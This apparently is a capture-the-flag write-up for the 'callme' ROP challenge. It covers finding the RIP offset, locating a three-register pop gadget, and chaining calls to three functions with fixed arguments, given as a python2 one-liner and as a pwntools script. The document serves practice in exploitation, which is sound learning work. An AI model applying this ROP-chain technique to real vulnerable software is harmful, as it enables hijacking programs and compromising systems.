# Basic Test:

## Check call system into binary file
```bash
strace ./callme
```

## Check protection into binary file
```bash
checksec ./callme
```

    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'

<br>

# Exploitation:

## Clear the kernel ring buffer
```bash
sudo dmesg -C
```

## Find offset for overwrite RIP
```bash
python2 -c 'print "A"*40 + "B"*4*' | ./callme
```

## See output
```bash
sudo dmesg -T
```

	[dim. avril  9 13:59:38 2023] callme[109227]: segfault at a42424242 ip 0000000a42424242 sp 00007ffef8e2a290 error 14 in libc.so.6[7fd84201f000+26000] likely on CPU 0 (core 0, socket 0)

## Find the a gadget for three parameters

```bash
ROPgadget --binary ./callme | grep "pop rdi ; pop rsi ; pop rdx"
```
 
	0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret

## Write the 3 function parameters

	args_1: BIG ENDIAN 0xdeadbeefdeadbeef => LITTLE ENDIAN \xef\xbe\xad\xde\xef\xbe\xad\xde 
	args_2: BIG ENDIAN 0xcafebabecafebabe => LITTLE ENDIAN \xbe\xba\xfe\xca\xbe\xba\xfe\xca
	args_3: BIG ENDIAN 0xd00df00dd00df00d => LITTLE ENDIAN \x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0

## Find the address of the 3 functions
```bash
pwngdb> disass*usefulFunction
```

	   0x00000000004008f2 <+0>:     push   rbp
	   0x00000000004008f3 <+1>:     mov    rbp,rsp
	   0x00000000004008f6 <+4>:     mov    edx,0x6
	   0x00000000004008fb <+9>:     mov    esi,0x5
	   0x0000000000400900 <+14>:    mov    edi,0x4
	   0x0000000000400905 <+19>:    call   0x4006f0 <callme_three@plt>
	   0x000000000040090a <+24>:    mov    edx,0x6
	   0x000000000040090f <+29>:    mov    esi,0x5
	   0x0000000000400914 <+34>:    mov    edi,0x4
	   0x0000000000400919 <+39>:    call   0x400740 <callme_two@plt>
	   0x000000000040091e <+44>:    mov    edx,0x6
	   0x0000000000400923 <+49>:    mov    esi,0x5
	   0x0000000000400928 <+54>:    mov    edi,0x4
	   0x000000000040092d <+59>:    call   0x400720 <callme_one@plt>
	   0x0000000000400932 <+64>:    mov    edi,0x1
	   0x0000000000400937 <+69>:    call   0x400750 <exit@plt>

## Payload final CLI

```bash
python2 -c 'print "A"*40 + "\x3c\x09\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" + "\x20\x07\x40\x00\x00\x00\x00\x00" + "\x3c\x09\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" + "\x40\x07\x40\x00\x00\x00\x00\x00" + "\x3c\x09\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" + "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" + "\xf0\x06\x40\x00\x00\x00\x00\x00"' | ./callme # pop rdi ; pop rsi ; pop rdx = 0x000000000040093c + args1 = 0xdeadbeefdeadbeef + args2 = 0xcafebabecafebabe + args3 = 0xd00df00dd00df00d + call callme_one = 0x400720 + pop rdi ; pop rsi ; pop rdx = 0x000000000040093c + args1 = 0xdeadbeefdeadbeef + args2 = 0xcafebabecafebabe + args3 = 0xd00df00dd00df00d + call callme_two = 0x400740 + pop rdi ; pop rsi ; pop rdx = 0x000000000040093c + args1 = 0xdeadbeefdeadbeef + args2 = 0xcafebabecafebabe + args3 = 0xd00df00dd00df00d + call callme_three = 0x4006f0
```

## Python2 pwntools script
```python
#usr/bin/python2
from pwn import *

  

padding = "A"*40
pop_rsi_rdi_rdx = p64(0x000000000040093c)
args1 = p64(0xdeadbeefdeadbeef)
args2 = p64(0xcafebabecafebabe)
args3 = p64(0xd00df00dd00df00d)
callme_one = p64(0x400720)
callme_two = p64(0x400740)
callme_three = p64(0x4006f0)

  

payload = padding + pop_rsi_rdi_rdx + args1 + args2 + args3 + callme_one
payload += pop_rsi_rdi_rdx + args1 + args2 + args3 + callme_two
payload += pop_rsi_rdi_rdx + args1 + args2 + args3 + callme_three

  

io = process("./callme")
io.sendline(payload)
io.interactive()
```